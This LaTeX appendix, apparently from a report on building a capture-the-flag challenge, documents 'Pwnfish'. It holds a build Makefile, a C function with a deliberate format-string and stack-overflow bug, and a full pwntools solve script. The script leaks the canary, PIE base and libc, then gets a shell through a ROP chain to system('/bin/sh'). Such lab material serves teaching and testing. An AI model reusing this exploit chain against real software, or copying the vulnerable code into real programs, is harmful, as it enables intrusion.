\section{Pwnfish Appendix}

\subsection{Makefile}\label{apx:pwnfish-makefile}

\begin{minted}[linenos]{basemake}
CC = gcc
CFLAGS = -std=c11 -Wall -Wextra -z relro -z noexecstack -fstack-protector-strong -pie -fpie -fPIE
BINARY = ./build/pwnfish

$(BINARY): main.c fish_t.h
        $(CC) $(CFLAGS) -o $@ $^
        cp $(BINARY) ../../solution/
        cp $(BINARY) main.c fish_t.h ../../handout/

.PHONY = clean, run

clean:
        rm $(BINARY)

run: $(BINARY)
        $(BINARY)
\end{minted}
\begin{listing}[H]
    \caption{Pwnfish Makefile}
    \label{lst:pwnfish-makefile}
\end{listing}

\subsection{\code{show\_fish} function}\label{apx:show_fish}


\begin{minted}[linenos]{c}
void show_fish() {
    char name[MAX_NAME_LENGTH];
    printf("Enter name of fish: ");
    scanf("%s", name);
    printf("\n");

    fish_t *curr = head;
    while (curr != NULL) {
        if (strcmp(name, curr->name) == 0) {
            printf(curr->name);
            print_species(curr->species);
            printf("Species: %s\n", species_names[curr->species]);
            printf("\n");
            break;
        }
        curr = curr->next;
    }
}
\end{minted}
\begin{listing}[H]
    \caption{\code{show\_fish}}
    \label{fig:show-fish}
\end{listing}

\subsection{\code{solve.py}}\label{apx:pwnfish-solve}

\begin{minted}[linenos]{python}
import os

from pwn import *
from sshtunnel import SSHTunnelForwarder

SSH_DOMAIN = os.environ["SSH_SERVICE_INTERNAL_URL"]
SSH_PORT = int(os.environ["SSH_PORT"])

# Logging
logging.basicConfig(level=logging.INFO)

REMOTE_HOST = "pwnfish"
REMOTE_PORT = 1337

LOCAL_HOST = "127.0.0.1"
LOCAL_PORT = 3242

server = SSHTunnelForwarder(
    (SSH_DOMAIN, SSH_PORT),
    ssh_username="gl",
    ssh_password="hf",
    allow_agent=False,
    host_pkey_directories=None, 
    remote_bind_address=(REMOTE_HOST, REMOTE_PORT),
    local_bind_address=(LOCAL_HOST, LOCAL_PORT),
)

server.start()
print("server local bind port: " + str(server.local_bind_port))
print("Tunnel is up.")


context.log_level = "warn"

binary = "./pwnfish"

elf = context.binary = ELF(binary, checksec=False)

context.terminal = ["cmd.exe", "/c", "start", "wsl.exe"]

gdbscript = """
break *main
c
"""

libc = ELF('libs/libc.so.6', checksec=False)

whitespace_bytes = [
    b'\x20',  # space
    b'\x09', # horizontal tab
    b'\x0a',  # newline (line feed)
    b'\x0b',  # vertical tab
    b'\x0c',  # form feed
    b'\x0d'  # carriage return
]

def menu(io, choice):
    io.sendlineafter(b"> ", f"{choice}".encode())

def catch_fish(io, name):
    menu(io, 1)
    io.sendlineafter(b"Name your new pet: ", name)

def show_fish(io, name):
    menu(io, 2)
    io.sendlineafter(b"Enter name of fish: ", name)

def leak_any(io, payload):
    catch_fish(io, payload)
    show_fish(io, payload)
    io.recvline()
    # return io.recvline()

def leak_pointer(io, i: int):
    catch_fish(io, f"%{i}$p".encode())
    show_fish(io, f"%{i}$p".encode())
    io.recvline()
    return io.recvline()

def contains_whitespace(payload) -> bool:
    for byte in whitespace_bytes:
        if byte in payload:
            return True
    return False

def run():
    elf.address = 0
    libc.address = 0

    p = remote(LOCAL_HOST, LOCAL_PORT)
    # p = gdb.debug(binary, gdbscript)

    # Leak canary
    canary = int(leak_pointer(p, 13), 16)
    info("Canary: %#x", canary)

    # Leak stored rip to compute PIE base address
    # stored rip points to menu+menu_leak_offset
    # found manually using gdb
    menu_leak_offset = 256
    leaked_menu = int(leak_pointer(p, 15), 16) - menu_leak_offset
    info("offset of menu: %#x", elf.functions.menu.address)
    elf.address = leaked_menu - elf.functions.menu.address
    info("leaked address: %#x", leaked_menu)
    info("piebase: %#x", elf.address)

    # Leak puts address from GOT
    info("GOT puts address: %#x", elf.got['puts'])
    puts_address = p64(elf.got['puts'])

    # scanf stops reading on whitespace
    if contains_whitespace(puts_address):
        print("Retrying: Whitespace in puts address")
        return False

    payload = flat(
        b"%9$s".ljust(8, b'A'), # Padded so puts address is aligned for %9$s
        elf.got['puts'],
    )
    leak_any(p, payload)
    leaked_puts = u64(p.recv(6) + b"\x00\x00") # last two null bytes are not read by printf
    info("Leaked puts: %#x", leaked_puts)
    
    # Compute libc base address
    libc.address = leaked_puts - libc.symbols.get('puts')
    info("libc base: %#x", libc.address)
    system = libc.functions.system.address
    info("system address: %#x", system)
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    info("/bin/sh address: %#x", bin_sh)

    rop = ROP(libc, badchars='\n;=')
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    # ret gadget used to align stack 
    ret_align = rop.find_gadget(['ret']).address

    # NOTE: curr pointer is stored at a lower address (closer to rsp) than name buffer
    # therefore we can safely overwrite the name buffer without
    # messing with the curr pointer,
    # and thus safely make it to the ret instruction for the ROP chain

    # bytes to canary (found with gdb)
    padding_length = 40 # (56 to rip, 40 = 56 - canary - rbp)

    payload = flat(
        b"A" * padding_length,
        canary,
        p64(0), # old rbp, not important
        pop_rdi,
        bin_sh,
        ret_align,
        system,
    )

    if contains_whitespace(payload):
        print("Retrying: Whitespace in payload")
        return False

    # Perform buffer overflow
    show_fish(p, payload)
    p.recvline()

    p.sendline(b"cat flag")
    flag = p.recvline().decode("utf-8").strip()
    print(flag)
    p.close()

    flag_filename = "/run/solution/flag.txt"
    os.makedirs(os.path.dirname(flag_filename), exist_ok=True)
    with open(flag_filename, "w") as f:
        f.write(flag)
    return True

if __name__ == "__main__":
    # May fail if payload happens to contain whitespace
    # Try 20 times, though a couple tries should be enough
    for i in range(20):
        if run():
            server.stop()
            print("Status: Success")
            exit(0)

    server.stop()
    print("Status: Failed")
    exit(-1)
\end{minted}
\begin{listing}[H]
  \vspace{-1.5\baselineskip} % Justerer afstanden mellem tekst og liste
 \caption{Pwnfish \code{solve.py}}
\label{fig:pwnfish-solve}
\end{listing}